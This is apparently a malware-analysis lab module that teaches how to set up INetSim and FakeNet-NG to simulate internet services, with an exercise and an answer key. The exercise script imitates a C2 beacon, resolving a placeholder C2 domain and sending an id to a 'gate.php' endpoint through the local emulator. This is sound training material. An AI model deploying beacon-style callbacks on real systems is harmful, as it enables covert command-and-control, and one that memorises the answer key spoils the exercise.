# 38 * Network emulation (INetSim / FakeNet-NG) -- LAB-LINUX

## Overview (plain language)
When you run a piece of suspicious software to watch what it does, it usually tries to talk to the internet — reaching out to web servers, sending email, or asking a name server where to find its command-and-control host. Letting that traffic hit the real internet is dangerous: the malware could download more payloads, alert its operator, or attack others. Network emulation tools solve this by pretending to BE the internet. INetSim and FakeNet-NG stand up fake versions of common services (DNS, HTTP, HTTPS, SMTP, FTP, and more) so that no matter where the sample tries to connect, it gets a believable-looking answer while every request is quietly logged. This lets an analyst safely observe a program's network behavior — the domains it wants, the files it requests, the data it tries to exfiltrate — without ever letting a single packet reach a live attacker.

## Tools covered
| Tool | Install | Purpose |
|---|---|---|
| INetSim | apt install inetsim | Internet services simulation suite (DNS/HTTP/HTTPS/SMTP/FTP/etc.) that answers a sample's connections and logs them |
| FakeNet-NG | pip install fakenet-ng | Dynamic network-interception tool that redirects and responds to a sample's traffic on the analysis host and captures a PCAP |

## Learning objectives
- Configure and launch INetSim to simulate DNS and HTTP(S) services and confirm services are listening.
- Redirect a client's DNS/HTTP requests to the emulator and verify responses are served from the fake environment.
- Use FakeNet-NG to intercept traffic on the local host and produce a PCAP plus captured request log.
- Locate and interpret the emulator log files that record requested domains, URLs, and payloads.
- Explain why network emulation is required for safe dynamic malware analysis.

## Environment check
```bash
# Confirm both tools are installed on LAB-LINUX (REMnux ships both)
inetsim --version 2>&1 | head -n 3
fakenet -h 2>&1 | head -n 5
# Confirm we can see which service ports are free/listening
ss -tulpn | head -n 5
```
Expected output: INetSim prints its version banner (e.g. `INetSim 1.3.2`), FakeNet-NG prints its usage/help header, and `ss` lists current listening sockets so you can spot conflicts before starting a simulator.

## Guided walkthrough
1. Prepare a working directory and a minimal INetSim config that enables DNS and HTTP and binds all replies to the loopback address.
```bash
mkdir -p ~/lab38 && cd ~/lab38
cat > inetsim.conf <<'EOF'
service_bind_address    127.0.0.1
dns_default_ip          127.0.0.1
start_service dns
start_service http
start_service https
EOF
cat inetsim.conf
```
Expected: the config file is echoed back showing DNS/HTTP/HTTPS enabled and all binds pointed at `127.0.0.1`.

2. Launch INetSim against that config. It reports each service it starts.
```bash
sudo inetsim --config ~/lab38/inetsim.conf --data-dir /var/lib/inetsim --log-dir ~/lab38/log &
sleep 3
ss -tulpn | grep -E ':(53|80|443)\b'
```
Expected: INetSim prints `* dns_53_tcp_udp - started`, `* http_80_tcp - started`, `* https_443_tcp - started`, and `ss` confirms sockets listening on ports 53, 80, and 443.

3. Simulate a sample's behavior: resolve any domain (it should return the fake IP) and fetch a URL (INetSim serves a default page).
```bash
dig @127.0.0.1 evil-c2.example.com +short
curl -s http://127.0.0.1/malware.bin -o /tmp/served.bin && file /tmp/served.bin
```
Expected: `dig` returns `127.0.0.1` for the arbitrary domain, and `curl` downloads INetSim's default fake object; `file` reports its type. INetSim logs the request under `~/lab38/log/`.

4. As an alternative, run FakeNet-NG which intercepts locally and writes a PCAP.
```bash
sudo fakenet 2>&1 | head -n 20
# In another shell, generate traffic, then stop FakeNet with Ctrl+C to flush the PCAP
ls -1 packets_*.pcap 2>/dev/null | head -n 1
```
Expected: FakeNet-NG starts its Diverter and listeners, responds to any outbound connection, and on shutdown writes a timestamped `packets_YYYYMMDD_HHMMSS.pcap` recording every intercepted flow.

## Hands-on exercise
Sample artifact: `exercise/beacon_client.sh` — a **benign, inert shell script** (NOT malware) that mimics a beacon by making one DNS lookup and one HTTP GET to a hard-coded fake C2 domain. It performs no privileged action and only talks to your local emulator. Safe origin: generated on-VM by the command below (no egress; the emulator answers all requests, and you should run it with your host firewall configured to drop outbound traffic).

Generate the sample:
```bash
mkdir -p exercise
cat > exercise/beacon_client.sh <<'EOF'
#!/usr/bin/env bash
# BENIGN beacon simulator — talks only to the local emulator
TARGET_DOMAIN="update.malware-lab.example"
dig @127.0.0.1 "$TARGET_DOMAIN" +short
curl -s "http://$TARGET_DOMAIN/gate.php?id=203.0.113.10" -o /tmp/beacon_reply.bin
echo "beacon complete"
EOF
chmod +x exercise/beacon_client.sh
sha256sum exercise/beacon_client.sh
```

Tasks:
1. Start INetSim (DNS + HTTP) as in the walkthrough.
2. Run `exercise/beacon_client.sh` with DNS pointed at `127.0.0.1`.
3. From the INetSim log, identify (a) the domain the beacon resolved and (b) the exact HTTP path/URL it requested.

## SOC analyst perspective
In a triage lab, a defender detonates a suspicious binary inside an isolated VM with INetSim or FakeNet-NG standing in for the internet, so the sample reveals its true network behavior with zero risk of contacting a live operator. The emulator logs become gold: every requested domain, URI, User-Agent, and SMTP recipient is a candidate indicator of compromise. Analysts feed those extracted domains/IPs into Security Onion as detection content — Suricata/Zeek DNS and HTTP rules, and Kibana dashboards hunting the same beacon interval or URI pattern across production PCAP and logs. This directly supports ATT&CK detection for T1071 (Application Layer Protocol), T1568 (Dynamic Resolution), and T1041 (Exfiltration Over C2 Channel) by turning a single detonation into reusable network signatures.

## Attacker perspective
Attackers assume their malware may be detonated in a sandbox, so C2 clients probe for exactly the flat, over-eager responses these emulators produce — a real HTTPS gate has a specific certificate CN and returns particular status codes, whereas INetSim serves a generic default object for any URL. Malware may therefore fingerprint the environment (checking cert issuers, non-routable resolver replies, or that every domain resolves) and go dormant to evade analysis, an example of T1497 (Virtualization/Sandbox Evasion). From the offensive tooling side, adversaries themselves run fake DNS/HTTP responders (like fakedns or rogue listeners) during phishing and MITM operations. The artifacts they leave for defenders include emulator or responder log files, unexpected local listeners on 53/80/443, generated self-signed certificates, and captured PCAPs showing every callback attempt.

## Answer key
Sample: `exercise/beacon_client.sh` — benign inert bash beacon simulator, generated on-VM (see generator above). Compute and record its digest with `sha256sum exercise/beacon_client.sh` (the validator holds the reference digest for the committed copy).

Expected findings and the commands that produce them:
```bash
# (a) The resolved domain returns the fake INetSim IP
dig @127.0.0.1 update.malware-lab.example +short          # -> 127.0.0.1

# (b) The requested HTTP URL/path appears in the INetSim HTTP log
grep -Eo 'GET [^ ]+' ~/lab38/log/*.log | head -n 5
# -> GET /gate.php?id=203.0.113.10

# Confirm the beacon received a served reply object
file /tmp/beacon_reply.bin                                 # -> data / HTML (INetSim default object)
```
Findings: (a) `update.malware-lab.example` resolves to `127.0.0.1`; (b) the beacon requested `GET /gate.php?id=203.0.113.10`, logged by INetSim's HTTP service; the download `/tmp/beacon_reply.bin` is INetSim's benign default object.

## MITRE ATT&CK & DFIR phase
- **T1071 – Application Layer Protocol** (HTTP/DNS C2 observed via the emulator).
- **T1568 – Dynamic Resolution** (arbitrary domains resolving to the simulated IP).
- **T1041 – Exfiltration Over C2 Channel** (beacon query-string data captured).
- **T1497 – Virtualization/Sandbox Evasion** (why emulators must look realistic).
- **DFIR phase:** Examination / Analysis (dynamic malware analysis) — feeding extracted IOCs into the Identification phase of downstream hunts.

## Sources
- REMnux — INetSim tool docs: https://docs.remnux.org/discover-the-tools/handle+network+interactions/simulate+internet+services
- REMnux — FakeNet-NG tool docs: https://docs.remnux.org/discover-the-tools/handle+network+interactions/intercept+network+connections
- INetSim official project site & manual: https://www.inetsim.org/
- Mandiant/FLARE FakeNet-NG repository: https://github.com/mandiant/flare-fakenet-ng
- SANS FOR610 — Reverse-Engineering Malware (dynamic analysis with simulated network): https://www.sans.org/cyber-security-courses/reverse-engineering-malware-malware-analysis-tools-techniques/
- MITRE ATT&CK T1071: https://attack.mitre.org/techniques/T1071/ and T1497: https://attack.mitre.org/techniques/T1497/